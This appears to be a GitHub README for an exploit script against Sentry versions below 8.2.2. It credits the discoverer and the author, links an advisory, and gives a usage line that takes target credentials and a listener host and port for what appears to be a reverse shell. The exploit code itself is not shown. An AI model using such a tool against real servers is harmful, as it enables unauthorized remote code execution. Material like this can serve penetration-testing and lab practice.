# Sentry-Authenticated-Remote-Code-Execution
## Sentry &lt; 8.2.2 Pickle Deserialization to RCE

<h4> Discovered By : Clement Berthaux (SYNACKTIV) </h4>
<h4> Exploit Authored By : Mohin Paramasivam (Shad0wQu35t)
<h4> HTB Profile : https://app.hackthebox.eu/profile/16731 </h4>
<h4> Advisory Link : https://doc.lagout.org/Others/synacktiv_advisory_sentry_pickle.pdf </h4>
<h4> Exploit DB Link :  </h4>

<h4> Usage : python exploit.py --url `http://puturhostnamehere/auth/login/sentry/` -U `username` -P `password` -l `LHOST` -p `LPORT`</h4>
  

![alt text](https://github.com/mohinparamasivam/Sentry-Authenticated-Remote-Code-Execution/blob/main/sentry_exploit.png?raw=true)              
              


# Dependencies

<h4>pip install requests</h4>
<h4>pip install bs4</h4>
<h4>pip install argparse</h4>

